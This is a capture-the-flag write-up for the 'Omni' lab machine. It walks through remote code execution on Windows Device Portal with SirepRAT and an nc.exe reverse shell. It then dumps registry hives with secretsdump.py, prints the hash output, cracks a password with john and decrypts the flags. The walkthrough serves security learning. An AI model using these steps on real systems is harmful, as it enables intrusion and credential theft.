# Omni

## Gaining Access

Nmap scan:

<figure><img src="../../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

### Port 8080

Port 8080 requires credentials to access:

<figure><img src="../../../.gitbook/assets/image (1928).png" alt=""><figcaption></figcaption></figure>

I did a detailed scan on port 8080, and found that it was running Windows Device Portal:

<figure><img src="../../../.gitbook/assets/image (767).png" alt=""><figcaption></figcaption></figure>

Windows Device Portal is related to IoT devices and it allows users to configure devices using it.

{% embed url="https://learn.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal" %}

So Googling for Windows Device Portal exploits led me to this:

{% embed url="https://github.com/SafeBreach-Labs/SirepRAT" %}

It seems that this is a Remote Access Trojan script that can be used to achieve RCE on the machine. I tested it using `powershell -c ipconfig`, and it worked well.

<figure><img src="../../../.gitbook/assets/image (3898).png" alt=""><figcaption></figcaption></figure>

We can use this to gain a reverse shell easily using `nc.exe`. This reverse shell would give us a SYSTEM shell, which is unique because we are already the administrator.

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

### User Flag

When trying to read the user flag, this is what we get:

```
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">flag</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>
    </Props>
  </Obj>
</Objs>
```

The usage of PSCredential there means that the flag has been encrypted with the user's password. Since we are the SYSTEM user, what we can do is copy over the `security`, `sam` and `system` registry folders and use `secretsdump.py` on it.

```
$ secretsdump.py -sam sam -security security -system system LOCAL
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x4a96b0f404fd37b862c07c2aa37853a5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a01f16a7fa376962dbeb29a764a06f00:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:330fe4fd406f9d0180d67adb0b0dfa65:::
sshd:1000:aad3b435b51404eeaad3b435b51404ee:91ad590862916cdfd922475caed3acea:::
DevToolsUser:1002:aad3b435b51404eeaad3b435b51404ee:1b9ce6c5783785717e9bbb75ba5f9958:::
app:1003:aad3b435b51404eeaad3b435b51404ee:e3cb0651718ee9b4faffe19a51faff95:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdc2beb4869328393b57ea9a28aeff84932c3e3ef
dpapi_userkey:0x6760a0b981e854b66007b33962764d5043f3d013
[*] NL$KM 
 0000   14 07 22 73 99 42 B0 ED  F5 11 9A 60 FD A1 10 EF   .."s.B.....`....
 0010   DF 19 3C 6C 22 F2 92 0C  34 B1 6D 78 CC A7 0D 14   ..<l"...4.mx....
 0020   02 7B 81 04 1E F6 1C 66  69 75 69 84 A7 31 53 26   .{.....fiui..1S&
 0030   A3 6B A9 C9 BF 18 A8 EF  10 36 DB C2 CC 27 73 3D   .k.......6...'s=
NL$KM:140722739942b0edf5119a60fda110efdf193c6c22f2920c34b16d78cca70d14027b81041ef61c6669756984a7315326a36ba9c9bf18a8ef1036dbc2cc27733d
[*] Cleaning up... 
```

This would give us a load of hashes. We can then use `john` to crack the hash for `app`, and find that it is `mesh5143`. Since we have the password, we can decrypt this to get the flag.

```
PS C:\Data\Users\app> (Import-CliXml -Path user.txt).GetNetworkCredential().Password
```

## Privilege Escalation

The administrator flag was also encrytped using the same method, so we have to find the administrator password. We can do the same thing to get the administrator flag.

```
PS C:\Data\Users\app> (Import-CliXml -Path C:\data\users\administrator\root.txt).GetNetworkCredential().Password
```

Weird machine, but I do appreciate the unique flags.&#x20;
